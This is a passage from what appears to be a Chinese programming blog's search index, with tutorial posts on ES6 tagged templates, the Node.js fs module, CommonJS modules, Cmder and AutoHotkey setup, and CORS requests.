&#39;] 第二参数: 15 第三参数: 50 tag 函数实际上以下面的形式调用: 1tag([&apos;Hello &apos;, &apos; world &apos;, &apos;&apos;], 15, 50) 我们来看一个更复杂的例子: 12345678910111213141516171819202122let total = 30let msg = passthru`The total is $&#123;total&#125; ($&#123;total*5&#125; with tax)`function passthru(literals) &#123; let result = &apos;&apos; let i = 0 console.log(literals) console.log(arguments) while (i &lt; literals.length)&#123; result += literals[i++] if (i &lt; arguments.length)&#123; result += arguments[i] &#125; &#125; return result&#125;console.log(msg) 上面这个例子，展示了如何将各个参数按照原来的位置拼合回去。 输出结果： 123[&quot;The total is &quot;, &quot; (&quot;, &quot; with tax)&quot;, raw: Array[3]][Array[3], 30, 150]he total is 30 (150 with tax) 值得注意的是 literals 是一个数组，并且是 arguments 中元素之一。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[fs模块(2)两种文件操作方式比较]]></title>
      <url>%2F2016%2F12%2F24%2Ffs%E6%A8%A1%E5%9D%97(2)%E4%B8%A4%E7%A7%8D%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F%E6%AF%94%E8%BE%83%2F</url>
      <content type="text"><![CDATA[0x00 fs.read() VS fs.readFile() fs.read()fs.read(fd, buffer, offset, length, position, callback) 从文件描述符 fd 中读取文件数据。 buffer 是一个缓冲区，读取的数据将会写入到这里。 offset 是开始向缓冲区 buffer 写入数据时的偏移量。 length 是一个整型值，指定了读取的字节数。 position 是一个整型值，指读取的文件起始位置，如果 position 为 null，将会从文件当前的位置读取数据。 callback 中回调函数，其中包含了三个参数(err, bytesRead, buffer)，分别表示：错误、读取的字节数、缓冲区。 使用 fs.read() 方法读取文件内容时，首先需要使用 fs.open() 方法创建一个文件描述符 fd。 fs.read() 方法可以实现部分文件内容的读取。 fs.readFile()fs.readFile(filename[, options], callback) filename 要读取的文件。 options 可选参数包含以下可选值的对象: encoding {String | Null} 默认：’utf8’ mode {Number} 默认：438 flag {String} 默认：’w’ callback 回调函数有2个参数 (err, data)，参数 data 是文件的内容。如果没有指定参数encoding, 则返回值为 Buffer。 fs.readFile() 方法能且只能读取文件的全部内容。 小论其实,fs.readFile() 方法是对 fs.read() 方法的封装。使用 fs.readFile() 主要用于方便取得文件的全部内容: 123fs.readFile(&apos;sample.txt&apos;, function(err, data)&#123; console.log(data.toString())&#125; 而如果使用 fs.read() 方法里实现对文件所有内容的读取则需要先使用 fs.stat() 检测文件的状态，然后使用 fs.open() 方法创建文件描述符,最后再使用 fs.read() 方法读取文件内容： 123456789101112131415161718192021&apos;use strict&apos;var fs = require(&apos;fs&apos;)fs.stat(&apos;sample.txt&apos;,function (err, stat) &#123; if (err)&#123; console.log(err) &#125; else &#123; if(stat &amp;&amp; stat.isFile())&#123; fs.open(&apos;sample.txt&apos;, &apos;r&apos;, function (err, fd) &#123; // 创建一与文件大小相同的 缓冲区 var readBuffer = new Buffer(stat.size) var len = stat.size var offset = 0 var filePosition = 0 fs.read(fd, readBuffer, offset, len, filePosition, function (err, readBytes, readResults) &#123; // 输出文件内容 readResults console.log(readResults.toString()) &#125;) &#125;) &#125; &#125;&#125;) 0x01 fs.write() VS fs.writeFile() fs.write()fs.write() 有两种形式,可以将一个 buffer 或 dta 字符串写入到文件描述符 fd 的指定文件中。 fs.write(fd, buffer, offset, length[, position], callback)fs.write(fd, data[, position[, encoding]], callback) fs.write(fd, buffer, offset, length[, position], callback) 参数如下： buffer 是一个缓冲区，是要写入到文件的数据。 offset 用于确认 buffer 写入数据时的偏移量。 length 是一个整型值，指定写入数据的长度。 position 是一个整型值，指写入文件的起始位置，如果 position 为 typeof position !== &#39;number&#39;，将会从文件当前的位置写入数据。 callback 中回调函数，其中包含了三个参数( err, writeBytes, buffer)，分别表示：错误、写入文件的字节数、缓冲区。 通过 offset 和 length 可以确定 buffer 的哪个部分将会被写入文件。 fs.write(fd, data[, position[, encoding]], callback) 参数如下: data 要写入文件的字符串（当写入数据不是 Buffer 时，将会被转为字符串）。 position 是个整数值，代表写入文件的起始位置。 encoding 指定写入字符串的编码方式 callback 中回调函数，其中包含了三个参数(err, writeBytes, buffer)，分别表示：错误、写入文件的字节数、缓冲区。 fs.write() 在没有等待回调而多次操作同一个文件是不安全的。在这种情况下，强烈推荐使用 fs.createWriteStream() 方法。 fs.writeFile()fs.writeFile(filename, data[, options], callback) filename: 要写入的文件。 data: 要写入的文件的数据，可以是一个buffer或字符串。 options: 一个包含以下可选值的对象 encoding {String | Null}: 写入数据的编码方式，默认：’utf8’。如果写入数据是buffer时，这个参数会被忽略。 mode {Number}: 默认：438 flag {String}: 默认：’w’ 当写入数据是字符串时，options参数可以是一个字符串，表示字符串编码方式，如：’utf8’。 callback回调函数有1个参数 (err)。err, 表示可能出现的错误。 小论同样的，fs.writeFile() 也是对 fs.write() 方法的进一步封装，使用 fs.readFile() 方法省略了创建文件描述符的过程，可以更方便的向文件写入数据。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[fs模块(1)基本文件操作]]></title>
      <url>%2F2016%2F12%2F23%2Ffs%E6%A8%A1%E5%9D%97(1)%E5%9F%BA%E6%9C%AC%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%2F</url>
      <content type="text"><![CDATA[0x00 fsjavascript 内置的 fs 模块就是文件系统模块，用于操作文件。不同于 Node.js 其它模块，fs 支持同步和异步操作。 0x01 查询文件信息 fs.stat()fs.stat(path, callback) 用于查询文件的大小、创建时间、权限等相关信息。 fs.stat() 是异步方法，还有一个同步方法 fs.statSync(path) 。示例如下： 123fs.stat(&apos;sample.txt&apos;, function (err, stats) &#123; console.log(stats)&#125;); 输出: 1234567891011121314&#123; dev: 438983934, mode: 33206, nlink: 1, uid: 0, gid: 0, rdev: 0, blksize: undefined, ino: 1125899906928368, size: 272, blocks: undefined, atime: 2016-12-23T14:47:12.378Z, mtime: 2016-12-23T14:47:12.380Z, ctime: 2016-12-23T14:47:12.407Z, birthtime: 2016-12-23T14:46:59.200Z &#125; 执行 fs.stat() 后会返回一个 stats 对象给回调函数，通过 stats 对象的属性和方法可以判断文件类型: 123fs.stat(&apos;sample.txt&apos;, function (err, stats) &#123; console.log(stats.isFile())&#125;); stats 对象中的方法 stats.isFile() stats.isDirectory() stats.isBlockDevice() 如果hi块设备，返回 true stats.isCharacterDevice() 如果是字符设备，返回 true stats.isSymbolicLink() 如果是符号链接(软连接，快捷方式)，返回 true stats.isFIFO() stats.isSocket() 0x02 打开文件 fs.open()标准的文件操作流程是先选择目标进行 fs.open() 操作，然后再对其进行读写访问。 fs.open(path, flags[, mode], callback) fs.open() 方法第一个参数是文件路径。第二个参数是标志位，标志位表示文件的打开模式。标志含义与 UNIX中 open 的标识位相同： r:以只读方式打开文件，数据流的初始位置在文件开始 r+:以可读写方式打开文件，数据流的初始位置在文件开始 w:如果文件存在，则将文件长度清0，即该文件内容会丢失。如果不存在，则尝试创建它。数据流的初始位置在文件开始 w+以可读写方式打开文件，如果文件不存在，则尝试创建它。如果文件存在，则将文件长度清0，即该文件内容会丢失。数据流的初始位置在文件开始 a:以只写方式打开文件，如果文件不存在，则尝试创建它，数据流的初始位置在文件末尾，随后的每次写操作都会将数据追加到文件后面。 a+:以可读写方式打开文件，如果文件不存在，则尝试创建它，数据流的初始位置在文件末尾，随后的每次写操作都会将数据追加到文件后面。 0x03 读取文件数据 fs.read()fs.read(fd, buffer, offset, length, position, callback) 文件打开后，就可以使用 fs.read() 方法进行读取，读取前需要创建一个用于保存文件数据的缓冲区。缓冲区数据最终会被传递到回调函数中。 12345678910111213141516171819202122232425262728293031323334353637/** * Created by onejustone on 2016/12/23. */&apos;use strict&apos;; var fs = require(&apos;fs&apos;);// 导入 fs 模块fs.open(&apos;sample.txt&apos;,&apos;r&apos;,function (err, fd) &#123; // 打开文件 if(err)&#123; console.log(err) &#125; else &#123; var readBuffer = new Buffer(102), // 创建保存数据的缓冲区 readBuffer offset = 0, // 读取文件的偏移量 len = readBuffer.length, // 读取文件的长度 filePosition = 100; // 读取文件的起始位置 fs.read(fd, readBuffer, offset, len, filePosition, function (err, dataBuffer) &#123; // 开始读取文件数据(二进制内容) if (err)&#123; console.log(err) &#125; else &#123; console.log(readBuffer) // 直接以二进制形式输出内容 console.log(&apos;获取得数据:&apos;+&apos; &apos;+readBuffer) // 以人类可读的形式输出内容 console.log(&apos;读取的总字节数:&apos; +&apos; &apos;+ dataBuffer + &apos;bytes&apos;); // 获得总的数据长度 &#125; &#125;) &#125;&#125;); 输出: 123&lt;Buffer ae e7 9a 84 20 60 61...&gt;获取得数据: 的 `fs` 模块就是文件系统模块，用于操作文件。不同于 Node.js 其它模块，`fs` 读取的总字节数: 102bytes 如上，文件 open 以后会从第 100 个字节开始，读取其后的 102 个字节的数据。读取完成后，fs.read() 会回调最后一个回调方法，然后就可以可以处理读取到的的缓冲的数据了。 fs.openSync() 是 fs.open() 方法的同步版本。 0x04 写入文件数据 fs.write()fs.write(fd, buffer, offset, length[, position], callback) 文件打开后，可以通过 fs.write() 方法传递一个数据缓冲区，以向打开的文件中写入数据。 1234567891011121314151617181920212223/** * Created by onejustone on 2016/12/23. */&apos;use strict&apos;; var fs = require(&apos;fs&apos;);// 导入 fs 模块//写入数据fs.open(&apos;sample.txt&apos;, &apos;a&apos;, function (err, fd) &#123; var writerBuffer = new Buffer(&quot;夜色中静悄悄，----&quot;), offset = 0, len = writerBuffer.length, filePosition = null; fs.write(fd, writerBuffer, offset, len, filePosition, function (err, writeBytes) &#123; if(err)&#123; console.log(err) &#125; else &#123; console.log(&apos;yes, write data successful!&apos;) &#125; &#125;)&#125;); fs.writeSync() 是 fs.write() 方法的同步版本。 0x05 关闭文件fs.close 用于关闭打开的文件。 12345678fs.open(&apos;sample&apos;,&apos;a+&apos;,function (err, fd) &#123; // Do something // close file fs.close(fd, function (err) &#123; &#125;)&#125;) 0x06 目录操作 fs.readdir(),fs.mkdir(),fs.rmdir()fs 模块对目录的操作主要有：fs.readdir()，读取文件夹下所有文件名。fs.mkdir()，创建目录。fs.rmdir()，删除目录。 fs.readdir(path, callback)fs.mkdir(path[, mode], callback)fs.rmdir(path, callback) fs.mkdir() 创建目录时有第二个可选参数用于指定目录权限，不指定是权限为 0777。这三个方法都有 sync 同步方法。 12345678910111213141516171819202122232425262728293031// 目录操作var fs = require(&apos;fs&apos;);// 导入 fs 模块var path = require(&apos;path&apos;);// 导入 path 模块// 读取目标文件内容fs.readdir(&apos;./&apos;, function (err, files) &#123; if(err)&#123; console.log(err) &#125; else &#123; console.log(files) &#125;&#125;);// 创建目录fs.mkdir(path.join(__dirname, &apos;./test&apos;), function (err) &#123; if(err)&#123; console.log(err) &#125; else &#123; console.log(&apos;make dir successful!&apos;) &#125;&#125;);// 删除目录fs.rmdir(path.join(__dirname, &apos;./test&apos;), function (err) &#123; if(err)&#123; console.log(err) &#125; else&#123; console.log(&apos;remove successful!&apos;) &#125;&#125;) 0x07 异步读取 封装的 fs.readFile() 异步读取文本文件Node.js 异步读取文本文件的代码如下: 123456789101112131415/** * Created by onejustone on 2016/12/23. */&apos;use strict&apos;; var fs = require(&apos;fs&apos;);// 导入 fs 模块fs.readFile(&apos;sample.txt&apos;, &apos;utf-8&apos;, function (err, data) &#123; if (err)&#123; console.log(err) &#125; else &#123; console.log(data) &#125;&#125;); 异步读取时，传入的回调函数接收两个参数，当正常读取时，err 参数为 null，data 参数为读取到的 String 。当读取发生错误时，err 参数代表一个错误对象，data 为 undefined。 这也是Node.js标准的回调函数：第一个参数代表错误信息，第二个参数代表结果。 异步读取二进制文件使用 Node.js 读取二进制文件，比如一张图片: 12345678fs.readFile(&apos;1.jpg&apos;, function (err, data) &#123; if (err) &#123; console.log(err) &#125; else &#123; console.log(data) console.log(data.length + &apos;bytes&apos;) &#125;&#125;) 当读取二进制文件时，不传入文件编码时，回调函数的data参数将返回一个Buffer 对象。在 Node.js 中，Buffer 对象就是一个包含零个或任意个字节的数组（注意和Array不同）。 Buffer 对象和 String 可以互换: 12345// Buffer -&gt; Stringvat text = data.toString(&quot;utf-8&quot;)// String -&gt; Buffervar buf = new Buffer(text, &quot;utf-8&quot;); 同步读取文件 fs.readFileSync()fs 模块中使用 readFileSync 来同步读取文本文件，该方法不接收回调函数，函数直接返回结果。 用 fs 模块同步读取一个文本文件的代码如下： 123456789&apos;use strict&apos;; var fs = require(&apos;fs&apos;);// 导入 fs 模块//同步文件操作//同步读取文本文件var data = fs.readFileSync(&apos;sample.txt&apos;,&apos;utf-8&apos;)console.log(data) 如果同步读取文件发生错误，则需要用 try...catch 捕获该错误： 123456try &#123; var data = fs.readFileSync(&apos;sample.txt&apos;, &apos;utf-8&apos;) console.log(data)&#125; catch (err) &#123; console.log(&apos;something error&apos;);&#125; 0x08 异步写文件 封装的 fs.writeFile()Node.js 中的 fs 模块通过 fs.writeFile() 来实现异步写文件。 语法: 1fs.writeFile(filename, data, [options], [callback(err)]) 使用 fs.writeFile() 写入数据到文件: 1234567891011var fs = require(&apos;fs&apos;)var data = &apos;忧郁的一片天，飘零的一片叶&apos;fs.writeFile(&apos;sample.txt&apos;, data, function (err) &#123; if (err)&#123; console.log(err) &#125; else &#123; console.log(&apos;yes&apos;) &#125;&#125;) 和 fs.readFile() 类似，fs.writeFile() 也有一个同步方法，叫 fs.writeFileSync()。 0x08 文件，目录的重名(移动)与删除 fs.rename() 文件,目录的命名(移动)fs.rename(oldPath, newPath, callback) 1234567891011121314const fs = require(&apos;fs&apos;)// 重命名文件fs.rename(&apos;sample.txt&apos;,&apos;title.txt&apos;,function (err) &#123; if (err)&#123;console.log(err)&#125; console.log(&quot;yes&quot;)&#125;)// 移动并重命名文件fs.rename(&apos;title.txt&apos;,&apos;./ES6/new_sample.txt&apos;,function (err) &#123; if (err)&#123;console.log(err)&#125; console.log(&quot;yes&quot;)&#125;) fs.unlink() 删除文件12345678const fs = require(&apos;fs&apos;)let file = &apos;out.txt&apos;fs.unlink(file,function (err) &#123; if(err)&#123;console.log(err)&#125; else &#123; console.log(&apos;yes delete!&apos;) &#125;&#125;) fs.rmdir() 删除目录123456s.rmdir(&apos;newDirectory&apos;,function (err) &#123; if(err)&#123;console.log(err)&#125; else &#123; console.log(&apos;yes delete!&apos;) &#125;&#125;)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[极速入门 Node.js]]></title>
      <url>%2F2016%2F12%2F23%2F%E6%9E%81%E9%80%9F%E5%85%A5%E9%97%A8Node.js%2F</url>
      <content type="text"><![CDATA[0x00 安装Node.js安装完 Node.js 以后可以使用 node -v 命令查看当前版本 12λ node -vv6.9.2 直接输入 node 指令则会进入到 Node.js 的命令行交互环境。 安装 NPMnpm 是 Node.js 的包管理工具（package manager)。通过 npm 可以获得许多我们需要的模块和代码，以及模块间的依赖。 安装 Node.js 的时候，npm 便已经安装好了，通过 npm -v 指令可以查看 npm 的版本 12λ npm -v3.10.9 0x01 第一个 Node 程序从现在开始，我们编写的JavaScript代码将不能在浏览器环境中执行了，而是在Node环境中执行，因此，JavaScript代码将直接在你的计算机上以命令行的方式运行。 1234567/*first_node.js*/&apos;use strict&apos;console.log(&quot;hello world&quot;)//λ node first_node.jshello world 第一行总是写上&#39;use strict&#39;,是因为我们总是以严格模式运行JavaScript代码，避免各种潜在陷阱。 使用严格模式如果有很多 JavaScript 文件，每个文件都写上 &#39;use strict&#39; 会很麻烦。我们可以给 Nodejs 传递一个参数，让 Node 直接为所有 js 文件开启严格模式： 1λ node --use_strict calc.js 当然，命令别名可以很方便的解决这个问题。 0x02 命令模式与 node 交互模式在命令行模式下，可以执行 node 进入 Node 交互式环境，也可以执行 node hello.js 运行一个 .js 文件。在 Node 交互式环境下，输入的 JavaScript 代码会被立刻执行。 0x03 使用 WebStorm 搭建 Node 开发环境WebStorm与IntelliJ IDEA同源，继承了IntelliJ IDEA强大的JavaScript部分的语法提示和运行调试功能。全平台，收费的商业软件，拥有30天的试用期。 下载安装完 WebStorm 后边可以新建工程，然后新建一个 javascript 文件开始编写代码了。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[模块(2)Node的全局对象]]></title>
      <url>%2F2016%2F12%2F23%2F%E6%A8%A1%E5%9D%97(2)Node%E7%9A%84%E5%85%A8%E5%B1%80%E5%AF%B9%E8%B1%A1%2F</url>
      <content type="text"><![CDATA[0x00Node.js 内置的常用模块实现了基本的服务器功能。比如,接收网络请求，读写文件，处理二进制内容，此外，也没有了浏览器的各种安全限制。 0x01 globalJavaScript 在浏览中有一个全局对象，window 对象，而在 Node.js 中,同样具有一个唯一的全局对象 global。 0x02 processprocess 对象是 Node.js 中以很重要的对象，它代表当前 Node.js 进程。JavaScript 程序是由事件驱动执行的单线程模型，Node.js 也不例外。 如果想要在下一次事件响应中执行代码，可以调用 process.nextTick()： 12345678910/** * Created by onejustone on 2016/12/23. */&apos;use strict&apos;;process.nextTick(function () &#123; console.log(&quot;nextTick callback!&quot;);&#125;);console.log(&quot;nextTick was set!&quot;); 输出: 12nextTick was set!nextTick callback! 这说明传入 process.nextTick() 的函数不是立刻执行，而是要等到下一次事件循环。 Node.js 进程本身的事件就由 process 对象来处理。如果我们响应 exit 事件，就可以在程序即将退出时执行某个回调函数： 1234567891011121314/** * Created by onejustone on 2016/12/23. */&apos;use strict&apos;;process.nextTick(function () &#123; console.log(&quot;nextTick callback!&quot;);&#125;);console.log(&quot;nextTick was set!&quot;);process.on(&apos;exit&apos;, function () &#123; console.log(&quot;I am waiting exit...&quot;)&#125;); 输出: 123nextTick was set!nextTick callback!I am waiting exit... 0x03 判断 javascript 执行环境我们可以根据浏览器和 Node 环境提供的全局变量名称来判断 javascript 的执行环境： 12345if (typeof (window) === &apos;undefined&apos;)&#123; console.log(&quot;node.js&quot;)&#125; else &#123; console.log(&quot;browser&quot;)&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[模块(1)模块初识]]></title>
      <url>%2F2016%2F12%2F23%2F%E6%A8%A1%E5%9D%97(1)%E6%A8%A1%E5%9D%97%E5%88%9D%E8%AF%86%2F</url>
      <content type="text"><![CDATA[0x00 模块为了解决一个文件中代码过多难于维护的问题，人们开始想具有不同功能的函数或者代码放在不同的文件中，这样每个文件包含的代码就相对较少，很多编程语言都采用这种组织代码的方式。 在 Node 环境中，一个 .js 文件就称之为一个模块（module）。 使用模块的好处是显而易见你的，不但提高的代码的可维护性，而且也避免了过多的重复造轮子，因为一个模块可以在多过地方被引用。 使用模块还可以避免函数名和变量名冲突。相同名字的函数和变量完全可以分别存在不同的模块中，而不必考虑名称是否会冲突。 module 和 require我们将给出两个模块：sub.js 和 main.js 123456789101112//sub.js/** * Created by onejustone on 2016/12/23. */&apos;use strict&apos;;var s = &apos;hello&apos;;function greet(name) &#123; console.log(s + &apos;,&apos; + name + &apos;!&apos;);&#125;module.exports = greet; module.exports 将会暴露 greet 函数，以方便在其它模块中调用该函数。 12345678910111213//main.js/** * Created by onejustone on 2016/12/23. */&apos;use strict&apos;;// 引入 sub 模块var greet = require(&quot;./sub&quot;);// 注意模块所在的路径var s = &apos;jack&apos;;greet(s); 在 main.js 模块中使用 Node 中提供的 require 方法获得 sub.js 模块中暴露的 greet 函数。 CommonJS 规范这种模块加载机制被称为CommonJS规范。在这个规范下，每个 .js 文件都是一个模块，它们内部各自使用的变量名和函数名都互不冲突，例如，sub.js 和 main.js 都申明了全局变量 var s = &#39;xxx&#39;，但互不影响。 一个模块想要对外暴露变量（函数也是变量），可以用 module.exports = variable; ，一个模块要引用其他模块暴露的变量，用 var ref = require(&#39;module_name&#39;); 就拿到了引用模块的变量。 输出的变量可以是任意对象，函数，数组等。 0x01 CommonJS模块机制首先需要知道的是, JavaScript 语言本身并没有一种模块机制来保证不同模块可以使用相同的变量名。比如,在 a.js 中使用了全局变量 s，那么，在 b.js 中也使用全局变量 s，将造成冲突，b.js 中对 s 赋值会改变 a.js 的运行逻辑。 但是,Node.js 却做到了，为何? 闭包，Node.js 通过把一段JavaScript代码用一个函数包装起来，这段代码的所有“全局”变量就变成了函数内部的局部变量。 以 hello.js 为例,真正的通过 Node.js 加载后的样子是: 12345678910/** * Created by onejustone on 2016/12/23. */(function () &#123; var s = &apos;hello&apos;; var name = &apos;world&apos;; console.log(s + &apos;&apos; + name + &apos;!&apos;); &#125;)(); 如此，全局变量 s 现在变成了匿名函数内部的局部变量。如果Node.js继续加载其他模块，这些模块中定义 全局变量 s 也互不干扰。 0x02 module.exports VS exports默认情况下，Node准备的 exports 变量和 module.exports 变量实际上是同一个变量，并且初始化为空对象 {}。 不过，当我们要输出的是一个函数或数组，那么，只能给 module.exports 赋值. 因此，强烈建议使用 module.exports = xxx 的方式来输出模块变量，这样，你只需要记忆一种方法。 1module.exports = funciton () &#123; return &apos;who are you?&apos;&#125;; 0x03 在一个模块中暴露多个对象12345678910111213141516171819// sub.js/** * Created by onejustone on 2016/12/23. */&apos;use strict&apos;;var who = &apos;who are you?&apos;;var where = &apos;where are you from?&apos;;function sayName(name) &#123; console.log(who + &quot;:&quot; + name);&#125;function sayLocation (location) &#123; console.log(where + &quot;:&quot; + location)&#125;module.exports.sayName = sayName;module.exports.sayLocation = sayLocation; 1234567891011121314/** * Created by onejustone on 2016/12/23. */&apos;use strict&apos;;// 引入 sub 模块var subModule = require(&quot;./sub&quot;);var name = &apos;jack&apos;;var location = &apos;earth&apos;;subModule.sayName(name);subModule.sayLocation(location); 运行 main.js: 1234who are you?:jackwhere are you from?:earthProcess finished with exit code 0]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Cmder篇]]></title>
      <url>%2F2016%2F12%2F22%2FCmder%E7%AF%87%2F</url>
      <content type="text"><![CDATA[0x00 安装 CmderCmder官网 http://cmder.net/ Cmder 官方提供的安装包作为一个压缩档的存在, 可即压即用，你甚至可以放到USB就可以虽时带着走，连调整过的设定都会放在这个目录下，不会用到系统机码(Registry)，所以也很适合放在Dropbox / Google Drive / OneDrive共享于多台电脑。 0x01 配置 Cmder添加 cmder 到 AutoHotKey12;Alt+c cmder!c::run E:\Program Files\cmder\Cmder.exe 默认开启设置输入win + alt + p或者 在底部右击点击 settings, 进入设置页面；可以根据自己的所需进行各种配置(字体，皮肤等等等等)。 如下图所示，可以设置PowerShell作为默认开启的选项；也可以更改默认开启是所在目录。 命令别名修改 Cmder 目录下 vendor\profile.ps1 文件，比如： 1234567Set-Alias st &quot;C:\Program Files\Sublime Text 3\sublime_text.exe&quot; function Git-Status &#123; git status &#125; Set-Alias gs Git-Statusfunction go-Work &#123;cd E:\work\web\cdn\&#125;Set-Alias gw go-Work]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[AutoHotkey篇]]></title>
      <url>%2F2016%2F12%2F22%2FAutoHotkey%E7%AF%87%2F</url>
      <content type="text"><![CDATA[0x00 前言AutoHotKey 的强大之处不多赘述，它由最初旨在提供键盘快捷键的脚本语言驱动(称为：热键)，随着时间的推移演变成一个完整的脚本语言，有兴趣的看官打可谷歌一下。 0x01 安装在浏览器中输入网址 http://www.autohotkey.com/ 进入AutoHotkey的官网，下载安装 AutoHotKey。 0x02 使用 AutoHotKey安装完成以后可以在任意位置创建一 AutoHotkey.ahk 脚本。双击该脚本既可以运行 AutoHotKey。当在里面写入相应的映射代码然后右击选择 reload this script 执行它就可以开始使用AutoHotkey里面设置好的功能了。 我们还可以为该脚本设置开机自启动，只需要将该脚本生成一个“快捷方式”，然后将此快捷方式放置到程序自启动文件夹之下即可,一般都在这儿： 1C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\ 0x03 配置首先我们需要了解下脚本中常用的符号所代表的含义: # 号代表 Win 键；! 号代表 Alt 键；^ 号代表 Ctrl 键；+ 号代表 shift 键；:: 号(两个英文冒号)起分隔作用；run 非常常用 的 AHK 命令之一;; 号代表 注释后面一行内容； 如果，需要使用快捷键 Alt+q 打开 QQ 可以在 AutoHotkey.ahk 脚本中添加如下内容: 12;Alt+q QQ!q::run E:\SoftWare\QQ\Bin\QQScLauncher.exe 0x04 我的配置文件1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465;Notes: #==win !==Alt 2015-05-20 ^==Ctr +==shift;Alt 组合打开常用软件;Alt+s sublime!s::run E:\Sublime Text 3\sublime_text.exe;Alt+g google chrome!g::run C:\Program Files (x86)\Google\Chrome\Application\chrome.exe;Alt+x xiami!x::run F:\Program Files (x86)\Xiami\XMusic\xmusic.exe;Alt+c cmder!c::run E:\Program Files\cmder\Cmder.exe;Alt+q QQ!q::run E:\SoftWare\QQ\Bin\QQScLauncher.exe;Alt+w webStorm!w::run E:\Program Files (x86)\JetBrains\WebStorm 2016.3.2\bin\webstorm.exe;Alt+y youdaonote!y::run F:\Youdao\YoudaoNote\YoudaoNote.exe;Win 组合快速打开网页#g::run https://www.google.com;Ctrl+shift+c 快速拷贝文件路径^+c::; null= send ^csleep,200clipboard=%clipboard% ;%null%tooltip,%clipboard%sleep,500tooltip,return#c::IfWinNotExist ahk_class Chrome_WidgetWin_1&#123; Run &quot;C:\Program Files (x86)\Google\Chrome\Application\chrome.exe&quot; WinActivate&#125;Else IfWinNotActive ahk_class Chrome_WidgetWin_1&#123; WinActivate&#125;Else&#123; WinMinimize&#125;Return;颜色神偷 Ctrl+Win+C^#c::MouseGetPos, mouseX, mouseY; 获得鼠标所在坐标，把鼠标的 X 坐标赋值给变量 mouseX ，同理 mouseYPixelGetColor, color, %mouseX%, %mouseY%, RGB; 调用 PixelGetColor 函数，获得鼠标所在坐标的 RGB 值，并赋值给 colorStringRight color,color,6; 截取 color（第二个 color）右边的6个字符，因为获得的值是这样的：#RRGGBB，一般我们只需要 RRGGBB 部分。把截取到的值再赋给 color（第一个 color）。clipboard = %color%; 把 color 的值发送到剪贴板return]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS服务器编程(5)CROS]]></title>
      <url>%2F2016%2F12%2F20%2FJS%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BC%96%E7%A8%8B(5)CROS%2F</url>
      <content type="text"><![CDATA[0x00 跨域资源共享CORS(Cross-Origin Resource Sharing, 跨域资源共享)是W3C的一个工作草案，定义了在必须访问跨资源请求时，浏览器与服务器应该怎样沟通。 其中具体的实现是为发送请求时为其添加一个额外的 Origin 头部，包含请求页面的源信息(协议，域名，端口)，以便服务器根据这个头部信息来决定是否给予响应。 浏览器请求的 Origin 头部: 1Origin: http://www.sina.com 如果服务器认为这个请求是可以接受的，就在 Access-Control-Allow-Origin 头部中会发相同的源信息(公共资源，可以会发 “*”). 1Access-Control-Allow-Origin： http://wwww.sina.com 如果该头部不存在，或者有这个头部但信息源不匹配，浏览器就会驳回请求。 0x01 IE CORS微软从 IE8 开始引用了 XDR(XDomainRequest) 类型来实现跨域通信。 与 XHR 对象类似，使用 XDR 对象首先需要创建一个 XDomianRequest 实例,调用 open() 方法以后再调用 send() 方法。不过 XDR 的 open 方法只接收两个参数: 请求的类型和 URL。即 XDR 的请求都是异步的。 请求返回之后会触发 load 事件，响应的数据也会保存在 responseText 属性中。 12345678910111213141516var xdr = new XDomainRequest()xdr.onload = function () &#123; console.log(xdr.responseText)&#125;xdr.onerror = function () &#123; console.log(&quot;An error occurred.&quot;&#125;xdr.timeout = 1000xdr.ontimeout = function ()&#123; console.log(&quot;Request too long&quot;)&#125;xdr.open(&quot;get&quot;, &quot;http://wwww.sina.com/pag&quot;)xdr.send(null) 由于 XDR 请求失败的因素很多，最好使用 onerror 事件处理程序来捕获该事件；否则，即使请求失败也不会有任何提示 为支持 POST 格式，XDR 对象提供了 ContentType 属性，用来表示发送数据的格式。 1234567891011var xdr = new XDomainRequest()xdr.onlode = function ()&#123; console.log(xdr.responseText)&#125;xdr.onerror = functinon () &#123; console.log(&quot;An error occurred)&#125;xdr.open(&quot;POST&quot;, &quot;http://www.sina.com/pages&quot;)xdr.contentType = &quot;application/x-www-form-urlencoded&quot;xdr.send(&quot;formData&quot;) 0x02 其它浏览器 CORS除 IE 以外的绝大部分浏览器都通过 XMLHttpRequest 对象实现了对 CORS 的原生支持。要请求另一域中的资源，只需要用标准的 XHR 对象并在 open 方法中传入绝对 URL 即可。 12345678910let xhr = new XMLRequest()xhr.onreadystatechange = function () &#123; if ((xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300) || xhr.status == 304)&#123; console.log(xhr.responseText &#125; else &#123; console.log(&quot;Unsuccessful:&quot; + xhr.status) &#125;&#125;xhr.open(&quot;get&quot;, &quot;http://www.somewhere.con/page/&quot;, true)xhr.send(null) 与 IE 中的 XDR 对象不同,通过跨域 XHR 对象可以访问 staus 和 statusText 属性，并且支持同步请求。当然，处于安全考虑，也为 XHR 添加了一些必要的限制。 不能使用 setRequestHeader() 设置自定义头部 不能发生和接收 cookie 调用 getAllResponseHeader() 方法会返回空字符 0x03 跨浏览器的 CORS检测 XHR 是否支持 CORS 的最简单的方式，就是检测是否存在 withCredentials 属性。再结合 XDomainRequest 对象是否存在，就可以实现以最基本的(以最简单的方式支持)跨 CORS 方案，兼顾所有的浏览器了。 1234567891011121314151617181920function createCORSRequest(method, url)&#123; let xhr = new XMLHttpRequest() if (&quot;widthCredentials&quot; in xhr)&#123; xhr.open(method, url, true) &#125; else if ( typeof XDomainRequest != &quot;undefined&quot;)&#123; xhr = new XDomainRequest() xhr.open(method, url) &#125; else &#123; xhr = null &#125; return xhr&#125;let request = createCORSRequest(&quot;get&quot;,&quot;http://www.somewhere.com/page/&quot;)if (request)&#123; request.onload = function ()&#123; //deal request.responseText &#125; request.send(null)&#125; 所有的浏览器都提供了一些通用的接口,即 XMLRequest 对象和 XDomainRequest 对象共有的属性/方法: abort(): 停止正在发送的请求 onerror(): 用于替代 onreadystatechange 检测错误 